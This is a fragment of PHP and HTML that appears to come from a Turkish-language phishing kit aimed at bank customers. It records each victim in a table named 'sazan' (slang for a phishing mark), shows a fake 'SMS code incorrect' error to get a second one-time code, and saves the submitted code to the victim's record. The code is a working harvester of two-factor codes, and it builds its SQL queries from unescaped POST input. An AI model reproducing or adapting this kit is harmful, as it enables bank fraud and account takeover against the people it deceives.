...
mysqli_query($mysqli, "UPDATE sazan SET now = 'SMS Hatalı' WHERE ip = '{$ip}'");

if($_POST)
{
	mysqli_query($mysqli, "UPDATE sazan SET sms = '{$_POST["sms2"]}' WHERE id = '{$queryid}'");
            ...
            <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                <fieldset>
                    ...
                    <div class="formRow required ">
                        <p style="color: red; font-weight: bold;">Girmiş olduğunuz sms şifresi yanlıştır. Telefonunuza gönderilen son sms şifresini giriniz</p>
                        <label for="egpField" class="rowLabel">Sms Şifreniz:
                        </label>
                        <div class="fieldGroup">
                        <input name="sms2" id="egpField" type="tel" maxlength="10" class="text" tabindex="2" aria-required="true" required="">
